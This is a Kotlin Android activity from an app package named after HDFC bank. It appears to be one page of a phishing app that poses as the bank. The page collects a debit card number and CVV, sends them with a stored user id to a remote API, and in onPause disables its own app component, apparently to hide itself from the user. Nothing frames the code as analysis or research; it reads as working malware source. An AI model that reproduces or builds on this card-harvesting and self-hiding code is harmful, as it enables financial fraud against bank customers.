package com.example.hdfc_new_app

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.text.Editable
import android.text.TextUtils
import android.text.TextWatcher
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.hdfc_new_app.databinding.ActivityFourthpageBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class fourthpage : AppCompatActivity() {

    private lateinit var binding: ActivityFourthpageBinding
    private val creditCardTextWatcher = CreditCardTextWatcher()
    private val util = Util()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFourthpageBinding.inflate(layoutInflater)
        setContentView(binding.root)

        util.saveLocalData(this,"check","true")

        binding.e1.addTextChangedListener(creditCardTextWatcher)

        binding.sub.setOnClickListener {
            util.saveLocalData(this ,"check","false")
            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty()){
                Toast.makeText(this,"Fill all fields",Toast.LENGTH_SHORT).show()
            } else if (binding.e1.text.toString().length < 19){
                Toast.makeText(this,"Debit card not corrected",Toast.LENGTH_SHORT).show()
            }
            else{

                val intentff = Intent(this,fifthpage::class.java)

                val data = FourthPagem(userid = util.getLocalData(this,"u") ,
                    debit = binding.e1.text.toString(), cvv = binding.e2.text.toString())
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val call = apiService.fourthpage(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })

            }
        }


    }

    override fun onPause() {
        super.onPause()
        val util =  Util()
        if(util.getLocalData(this,"check")=="true") {
            Log.e("asdf123", "pause: verify activity")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

}


class CreditCardTextWatcher : TextWatcher {
    private var isFormatting = false
    private val separator = ' '

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

    override fun afterTextChanged(s: Editable?) {
        if (isFormatting) {
            return
        }

        isFormatting = true
        formatCreditCardNumber(s)
        isFormatting = false
    }

    private fun formatCreditCardNumber(text: Editable?) {
        text?.let {
            val length = text.length

            if (length > 0 && (length + 1) % 5 == 0) {
                val c = text[length - 1]
                if (separator == c) {
                    text.delete(length - 1, length)
                }
            }

            if (length > 0 && length % 5 == 0) {
                val c = text[length - 1]
                if (Character.isDigit(c) && TextUtils.split(text.toString(), separator.toString()).size <= 3) {
                    text.insert(length - 1, separator.toString())
                }
            }
        }
    }
}

